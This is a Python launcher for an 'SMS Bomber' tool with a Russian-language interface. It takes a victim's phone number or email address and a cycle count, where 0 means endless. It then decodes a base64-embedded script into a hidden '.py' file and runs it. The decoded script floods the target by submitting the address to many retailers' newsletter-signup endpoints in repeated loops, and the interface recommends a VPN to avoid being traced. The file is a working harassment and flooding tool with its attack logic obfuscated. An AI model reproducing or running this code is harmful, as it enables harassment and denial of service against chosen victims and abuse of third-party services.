CAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gZW1haWwucmVwbGFjZSgnQCcsICclNDAnKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLm1pbmRib3gucnUvdjMvanMvb3BlcmF0aW9ucy9hc3luYz92ZXJzaW9uPTEuMC4yNzQmdHJhbnNwb3J0PWJlYWNvbiZvcGVyYXRpb249dXNlcnN1YnNjcmlwdGlvbiZlbmRwb2ludElkPWxlb21heDI0LXdlYnNpdGUmb3JpZ2luRG9tYWluPXd3dy5sZW9tYXgucnUnLCAnb3JpZ2luRG9tYWluPXd3dy5sZW9tYXgucnUmZGV2aWNlVVVJRD0wNmIxMzIxNS04ZWIyLTRhNTctYmI2ZC04ZDQwMTFiMDNkMDkmb3BlcmF0aW9uPXVzZXJzdWJzY3JpcHRpb24maWFuYVRpbWVab25lPUV1cm9wZSUyRk1vc2NvdyZlbmRwb2ludElkPWxlb21heDI0LXdlYnNpdGUmZGF0YT0lN0IlMjJjdXN0b21lciUyMiUzQSU3QiUyMmVtYWlsJTIyJTNBJTIye30lMjIlMkMlMjJjdXN0b21GaWVsZHMlMjIlM0ElN0IlMjJ1dG1zb3VyY2UlMjIlM0ElMjJ5YW5kZXglMjIlN0QlMkMlMjJzdWJzY3JpcHRpb25zJTIyJTNBJTVCJTdCJTIyYnJhbmQlMjIlM0ElMjJMZW9tYXgyNCUyMiUyQyUyMnBvaW50T2ZDb250YWN0JTIyJTNBJTIyRW1haWwlMjIlN0QlNUQlN0QlMkMlMjJwb2ludE9mQ29udGFjdCUyMiUzQSUyMmZvb3RlciUyMiU3RCcuZm9ybWF0KGVudGVyKSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9tb25ybzI0LnJ1L2FqYXguc3Vic2NyaWJlLnBocCcsZGF0YT17J2ZpcnN0bmFtZSc6ICfQk9C10L3QsNC00LjQuScsJ2VtYWlsJzogZW1haWwsJ21vYic6IDB9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5sYXNzaWVzaG9wLnJ1L2FqYXgvcmVnaXN0cmF0aW9uX2Jhbm5lcl9zdWJzY3JpYmUucGhwJywgZGF0YT17J2VtYWlsJzogZW1haWx9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3J1LnRvbW15LmNvbS93Y3MvcmVzb3VyY2VzL3N0b3JlLzMwMDIzL25ld3NsZXR0ZXIvc3Vic2NyaWJlJywganNvbj17InN0b3JlSWQiOiIzMDAyMyIsInNvdXJjZUNvZGUiOiJGT09URVIiLCJlbWFpbCI6ZW1haWwsImxhbmdJZCI6Ii0yMCIsImhhdmVDb21lRnJvbUZvb3Rlck9ySGVhZGVyTmV3c0xldHRlclNpZ251cCI6J3RydWUnLCJtZW5DaGVja2JveCI6J3RydWUnLCJ3b21lbkNoZWNrYm94IjondHJ1ZScsImtpZHNDaGVja2JveCI6J3RydWUnfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9saWNoaS5jb20vYXBpL3NpdGUvc3Vic2NyaWJlP3Nob3A9MiZsYW5nPTEnLCBkYXRhPXsnX3N1YnNjcmliZV9lbWFpbF8nOmVtYWlsfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9zZXJnaW5uZXR0aS5ydS9iaXRyaXgvdGVtcGxhdGVzLy5kZWZhdWx0L2FqYXgvc3Vic2NyaWJlLnBocCcsZGF0YT17J21haWwnOiBlbWFpbH0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vY3J1em8ucnUvaW5kZXgucGhwP3JvdXRlPWV4dGVuc2lvbi9tb2R1bGUvZGVjb3JfbmV3c2xldHRlci9zZW5kJywgZGF0YT17J25ld19lbWFpbCc6IGVtYWlsLCdhZ3JlZSc6IDF9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWycgKyBGb3JlLkNZQU4gKyBzdHIoY3ljbGUpICsgRm9yZS5CTFVFICsgJyDRhtC40LrQuyDQv9GA0L7QudC00LXQvSwg0L7RgdGC0LDQu9C+0YHRjCAnICsgRm9yZS5DWUFOICsgc3RyKGNvdW50IC0gY3ljbGUpICsgRm9yZS5CTFVFICsgJ10nKQogICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgW9CQ0YLQsNC60LAg0LfQsNC60L7QvdGH0LXQvdCwXScpCiAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgIG9zLnN5c3RlbSgncHl0aG9uIHN0YXJ0LnB5JykKCgplbHNlOgogICAgcHJpbnQoRm9yZS5CTFVFICsgJyDQntGI0LjQsdC60LAuINCe0YLQvNC10L3QsCDQstGL0L/QvtC70L3QtdC90LjRjyDQv9GA0L7Qs9GA0LDQvNC80YsnKQogICAgdGltZS5zbGVlcCgxKQogICAgb3Muc3lzdGVtKCdweXRob24gc3RhcnQucHknKQo='
try:
    from colorama.ansi import Fore
    import os, time
    import base64

except ModuleNotFoundError:
    print(Fore.GREEN + '\nУстановка недостающих модулей..' + Fore.RESET + '\n\n')
    time.sleep(2)
    os.system('pip install colorama')
    os.system('pip install requests')
    os.system('clear')
    os.system('python start.py')

os.system('clear')
q = ' ___  __  __  ___    ___              _'
w = '/ __||  \/  |/ __|  | _ ) ___  _ __  | |__  ___  _ _'
e = "\__ \| |\/| |\__ \  | _ \/ _ \| '  \ | '_ \/ -_)| '_|"
r = '|___/|_|  |_||___/  |___/\___/|_|_|_||_.__/\___||_| '
t = '      https://github.com/mestr228/SmsBomber.git'
y = '                https://t.me/mestr228          '

def incorrectOption():
    print(Fore.CYAN + ' Неверный номер опции')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

def incorrectPhone():
    print(Fore.CYAN + ' Неверный номер')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

def incorrectEmail():
    print(Fore.CYAN + ' Неверная почта')
    time.sleep(1)
    os.system('clear')
    os.system('python start.py')

#print(Fore.LIGHTRED_EX + 'hello' + Fore.LIGHTBLACK_EX + 'hello' + Fore.LIGHTBLUE_EX + 'hello' + Fore.LIGHTCYAN_EX + 'hello' + Fore.LIGHTGREEN_EX + 'hello' + Fore.LIGHTMAGENTA_EX + 'hello' + Fore.LIGHTWHITE_EX + 'hello' + Fore.LIGHTYELLOW_EX + 'hello')
#print(Fore.RED + 'hello' + Fore.BLACK + 'hello' + Fore.BLUE + 'hello' + Fore.CYAN + 'hello' + Fore.GREEN + 'hello' + Fore.MAGENTA + 'hello' + Fore.WHITE + 'hello' + Fore.YELLOW + 'hello')

print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')

print(Fore.BLUE + ' [+] ' + ' Выберите опцию ' + ' [+]\n')
print(Fore.BLUE + ' [0]' + Fore.CYAN + ' Закрыть программу')
print(Fore.BLUE + ' [1]' + Fore.CYAN + ' Спам телефона')
print(Fore.BLUE + ' [2]' + Fore.CYAN + ' Спам почты')

try:
    type = int(input(Fore.BLUE + '\n [Опция]: ' + Fore.CYAN))
except:
    incorrectOption()

if type == 0:
    print(Fore.CYAN + ' Буду ждать тебя!')
    exit()

elif type == 1:
    os.system('clear')
    print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')
    print(Fore.BLUE + ' [+]' + ' Спам телефона (Рекомендую использовать VPN)' + ' [+]\n')
    try:
        phone = int(input(Fore.BLUE + ' [79123456789]: ' + Fore.CYAN))
    except:
        incorrectPhone()

    if len(str(phone)) != 11:
        incorrectPhone()

    else:
        try:
            count = int(input('\n' + Fore.BLUE + ' [Количество циклов, 0 - бесконечно]: ' + Fore.CYAN))
        except:
            print(Fore.CYAN + ' Неверное число')
            time.sleep(1)
            os.system('clear')
            os.system('python start.py')
        os.system('clear')
        try:
            os.system('rm .email')
        except:
            pass
        phoneNymber = open('.phone', 'w+')
        phoneNymber.write(str(phone))
        phoneNymber.close()
        cycleCount = open('.count', 'w+')
        cycleCount.write(str(count))
        cycleCount.close()
        start = open('.py', 'w+')
        start.write(base64.b64decode(code.decode()).decode('utf-8'))
        start.close()
        os.system('python .py')

elif type == 2:
    os.system('clear')
    print(Fore.CYAN + q + '\n' + w + '\n' + e + '\n' + r + Fore.BLUE + '\n' + t + '\n' + y + '\n')
    print(Fore.BLUE + ' [+]' + ' Спам почты (Рекомендую использовать VPN)' + ' [+]\n')
    try:
        email = str(input(Fore.BLUE + ' [example@mail.ru]: ' + Fore.CYAN))
    except:
        incorrectEmail()

    if email.find('@') == -1 or email.find('.') == -1:
        incorrectEmail()

    else:
        try:
            count = int(input('\n' + Fore.BLUE + ' [Количество циклов, 0 - бесконечно]: ' + Fore.CYAN))
        except:
            print(Fore.CYAN + ' Неверное число')
            time.sleep(1)
            os.system('clear')
            os.system('python start.py')
        os.system('clear')
        try:
            os.system('rm .phone')
        except:
            pass
        emailAddress = open('.email', 'w+')
        emailAddress.write(email)
        emailAddress.close()
        cycleCount = open('.count', 'w+')
        cycleCount.write(str(count))
        cycleCount.close()
        start = open('.py', 'w+')
        start.write(base64.b64decode(code.decode()).decode('utf-8'))
        start.close()
        os.system('python .py')

else:
    incorrectOption()